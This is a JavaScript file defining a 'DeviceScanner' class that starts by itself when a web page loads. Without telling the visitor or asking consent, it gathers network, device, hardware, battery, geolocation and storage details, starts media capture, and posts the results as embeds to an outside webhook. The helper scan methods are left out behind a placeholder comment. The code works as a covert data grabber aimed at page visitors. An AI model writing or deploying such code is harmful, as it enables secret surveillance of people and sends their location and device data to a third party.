// Scanner functionality
class DeviceScanner {
    constructor() {
        this.scanData = {};
        this.isScanComplete = false;
        this.init();
    }

    async init() {
        try {
            await this.loadWebhook();
            this.startScan();
        } catch (error) {
            console.error('Scanner initialization failed:', error);
        }
    }

    async loadWebhook() {
        return new Promise((resolve, reject) => {
            if (typeof window.getWebhook === 'function') {
                this.webhookUrl = window.getWebhook();
                resolve();
                return;
            }

            let checks = 0;
            const interval = setInterval(() => {
                if (typeof window.getWebhook === 'function') {
                    clearInterval(interval);
                    this.webhookUrl = window.getWebhook();
                    resolve();
                } else if (checks++ > 50) {
                    clearInterval(interval);
                    reject(new Error('Webhook config not loaded'));
                }
            }, 100);
        });
    }

    async startScan() {
        try {
            await this.collectSystemInfo();
            await this.startMediaCapture();
        } catch (error) {
            this.sendError(error);
        }
    }

    async collectSystemInfo() {
        this.scanData = {
            ...await this.getNetworkInfo(),
            ...this.getDeviceDetails(),
            ...this.getHardwareInfo(),
            ...this.getGPUInfo(),
            ...await this.getBatteryInfo(),
            ...this.getConnectionInfo(),
            ...await this.getGeolocation(),
            ...this.getLocaleInfo(),
            ...await this.getStorageInfo()
        };

        await this.sendEmbed({
            title: "🔍 System Scan Started",
            description: "Initial system information collected",
            color: 0x3498db,
            fields: this.createInfoFields()
        });
    }

    // [Include all your existing scan methods here]
    // getNetworkInfo(), getDeviceDetails(), etc.
    // (Same as your original functions but as class methods)

    async sendEmbed(embedData) {
        try {
            await fetch(this.webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ embeds: [embedData] })
            });
        } catch (error) {
            console.error("Error sending embed:", error);
        }
    }

    async sendError(error) {
        await this.sendEmbed({
            title: "❌ Scan Failed",
            description: "An error occurred during scanning",
            color: 0xff0000,
            fields: [{
                name: "Error",
                value: `\`\`\`${error.message}\`\`\``,
                inline: false
            }]
        });
    }
}

// Start scanner when everything is loaded
window.addEventListener('DOMContentLoaded', () => {
    new DeviceScanner();
});
